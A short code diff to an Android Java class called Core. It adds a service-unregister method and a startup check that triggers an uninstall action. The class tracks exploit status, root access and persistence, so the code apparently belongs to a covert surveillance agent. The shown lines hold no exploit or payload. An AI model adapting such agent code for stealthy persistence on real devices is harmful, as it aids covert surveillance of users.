@@ -100,6 +100,15 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
+	public synchronized static void serivceUnregister(){
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (serivceUnregister) ...");
+		}
+		if (singleton != null && singleton.serviceMain != null) {
+			singleton.serviceMain.stopListening();
+		}
+	}
+
 	public static Core newCore(ServiceMain serviceMain) {
 		if (singleton == null) {
 			singleton = new Core();
@@ -165,6 +174,16 @@ public class Core extends Activity implements Runnable {
 							" exploitStatus= " + Status.getExploitStatusString());
 				}
 
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checking uninstall Markup");
+			}
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall ) {
+				UninstallAction.actualExecute();
+				return false;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checked uninstall Markup");
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
@@ -548,7 +567,6 @@ public class Core extends Activity implements Runnable {
 			//final Markup markup = new Markup(UNINSTALL_MARKUP);
 			if (haveUninstallMarkup()) {
 				UninstallAction.actualExecute();
-				//TODO: kill checkexploit
 				return ConfType.Error;
 			}
 
